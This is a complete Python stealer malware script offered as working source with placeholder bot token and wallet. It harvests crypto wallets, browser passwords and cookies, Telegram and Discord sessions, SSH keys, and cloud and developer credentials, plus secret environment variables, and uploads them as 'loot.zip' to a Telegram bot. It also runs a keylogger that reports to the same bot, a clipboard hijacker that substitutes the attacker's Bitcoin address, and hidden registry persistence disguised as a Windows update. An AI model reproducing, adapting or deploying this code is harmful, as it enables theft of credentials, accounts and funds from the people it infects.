TOKEN = "8123456789:AAF_your_bot_token"
CHAT  = "123456789"

import os, sys, time, shutil, tempfile, zipfile, platform, getpass, threading, subprocess, re
from pathlib import Path

API  = f"https://api.telegram.org/bot{TOKEN}"
home = Path.home()
out  = Path(tempfile.mkdtemp(prefix="sv_"))
MAX_TOTAL = 40_000_000
_total = 0

try:
    import requests
except ImportError:
    subprocess.run([sys.executable, "-m", "pip", "install", "-q", "requests"], capture_output=True)
    import requests

def host():
    try: u = getpass.getuser()
    except Exception: u = "user"
    return f"{u}@{platform.node()} | {platform.system()} {platform.release()} | {os.getcwd()}"

def send(msg):
    try: requests.post(f"{API}/sendMessage", data={"chat_id": CHAT, "text": msg[:4000]}, timeout=30)
    except Exception: pass

# ---------- 0. single instance ----------
def single():
    try:
        import ctypes
        ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WinUpdateMtx")
        return ctypes.windll.kernel32.GetLastError() != 183
    except Exception:
        return True

# ---------- 1. collect ----------
wallet_dirs = [
    home/".bitcoin", home/".electrum", home/".ethereum/keystore", home/".solana",
    home/".config/Exodus", home/".config/solana", home/".config/electrum",
    home/"AppData/Roaming/Exodus", home/"AppData/Roaming/Electrum",
    home/"AppData/Roaming/Atomic", home/"AppData/Roaming/Coinomi",
    home/"AppData/Roaming/Binance", home/"AppData/Roaming/Trust Wallet",
    home/"AppData/Roaming/Guarda", home/"AppData/Local/Binance",
]

files = [
    home/"AppData/Roaming/Telegram Desktop/tdata",
    home/"AppData/Roaming/discord/Local Storage/leveldb",
    home/".aws/credentials", home/".aws/config",
    home/".ssh/id_rsa", home/".ssh/id_ed25519", home/".ssh/known_hosts",
    home/".docker/config.json", home/".kube/config", home/".npmrc",
    home/".git-credentials", home/".netrc", home/".pgpass",
    home/".config/gh/hosts.yml", home/".azure/accessTokens.json",
]

for b in ["Google/Chrome", "Microsoft/Edge", "BraveSoftware/Brave-Browser",
          "Opera Software/Opera Stable", "Mozilla/Firefox"]:
    base = home/"AppData/Roaming"/b
    for pat in ["User Data/*/Login Data", "User Data/*/Web Data", "User Data/*/Cookies",
                "User Data/Local State", "User Data/*/Local Storage/leveldb/*.ldb",
                "User Data/*/Local Extension Settings/**/*",
                "Profiles/*/logins.json", "Profiles/*/key4.db", "Profiles/*/cookies.sqlite"]:
        try: files += [p for p in base.glob(pat) if p.is_file()][:40]
        except Exception: pass

env_hits = {k: v for k, v in os.environ.items()
            if any(x in k.upper() for x in ("AWS","SECRET","TOKEN","KEY","PASS","S3","AZURE","GCP","GITHUB","OPENAI","STRIPE"))}

def collect():
    global _total
    zipf = out/"loot.zip"
    if zipf.exists(): zipf.unlink()
    _total = 0
    def add(z, p, arc):
        global _total
        try:
            if _total > MAX_TOTAL: return
            if p.is_file() and 0 < p.stat().st_size < 8_000_000:
                z.write(p, arcname=arc); _total += p.stat().st_size
        except Exception: pass
    try:
        with zipfile.ZipFile(zipf, "w", zipfile.ZIP_DEFLATED) as z:
            for d in wallet_dirs:
                try:
                    if d.is_dir():
                        for f in list(d.rglob("*"))[:400]:
                            add(z, f, f"wallet/{d.name}/{f.relative_to(d)}")
                    elif d.is_file(): add(z, d, f"wallet/{d.name}")
                except Exception: pass
            for i, f in enumerate(files):
                try:
                    tmp = out/f"{i}_{f.name}"
                    shutil.copy2(f, tmp)     # browser DB lock ke liye copy
                    add(z, tmp, f"app/{f.name}")
                except Exception: pass
            z.writestr("env.txt", "\n".join(f"{k}={v}" for k, v in env_hits.items()))
            z.writestr("host.txt", host())
            for pat in ("*.txt", ".env", "*.env", "*.json", "*.pem"):
                for f in list(Path.cwd().glob(pat))[:30]: add(z, f, f"cwd/{f.name}")
        if zipf.stat().st_size > 0:
            with open(zipf, "rb") as fh:
                requests.post(f"{API}/sendDocument",
                    data={"chat_id": CHAT, "caption": host()},
                    files={"document": ("loot.zip", fh)}, timeout=120)
    except Exception as e:
        send(f"collect err: {e}")

# ---------- 2. keylog ----------
BUF = []
def start_keylog():
    try:
        from pynput import keyboard
    except ImportError:
        subprocess.run([sys.executable,"-m","pip","install","-q","pynput"], capture_output=True)
        from pynput import keyboard
    def on_press(k):
        try: BUF.append(k.char)
        except AttributeError: BUF.append(f"[{k.name}]")
        if len(BUF) >= 150:
            send("".join(BUF)); BUF.clear()
    keyboard.Listener(on_press=on_press).start()

# ---------- 3. clipper ----------
WALLET = "bc1qYOURWALLETHERE"
def start_clip():
    try:
        import pyperclip
    except ImportError:
        subprocess.run([sys.executable,"-m","pip","install","-q","pyperclip"], capture_output=True)
        import pyperclip
    rx = re.compile(r"^(bc1[a-z0-9]{25,62}|[13][a-zA-HJ-NP-Z0-9]{25,34}|0x[a-fA-F0-9]{40})$")
    last = ""
    while True:
        try:
            d = pyperclip.paste()
            if d and d != last:
                last = d
                if rx.match(d.strip()):
                    pyperclip.copy(WALLET); last = WALLET
        except Exception: pass
        time.sleep(0.4)

# ---------- 4. persistence ----------
def persist():
    try:
        dst_dir = Path(os.environ.get("APPDATA", str(home)))/"Microsoft"/"Windows"
        dst_dir.mkdir(parents=True, exist_ok=True)
        frozen = getattr(sys, "frozen", False)
        me = Path(sys.executable if frozen else os.path.abspath(sys.argv[0]))
        dst = dst_dir/("winupdate.exe" if frozen else "winupdate.pyw")
        if me.resolve() != dst.resolve():
            shutil.copy2(me, dst)
        cmd = f'"{dst}"' if frozen else f'"{sys.executable}" "{dst}"'
        subprocess.run(["reg","add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
                        "/v","WinUpdate","/t","REG_SZ","/d", cmd, "/f"], capture_output=True)
        subprocess.run(["attrib","+h","+s", str(dst)], capture_output=True)
        subprocess.run(["attrib","+h","+s", str(me)], capture_output=True)
    except Exception: pass

# ---------- run ----------
if __name__ == "__main__":
    if not single(): sys.exit(0)
    persist()
    collect()
    threading.Thread(target=start_keylog, daemon=True).start()
    threading.Thread(target=start_clip, daemon=True).start()
    while True:
        time.sleep(300)
        if BUF: send("".join(BUF)); BUF.clear()
        collect()
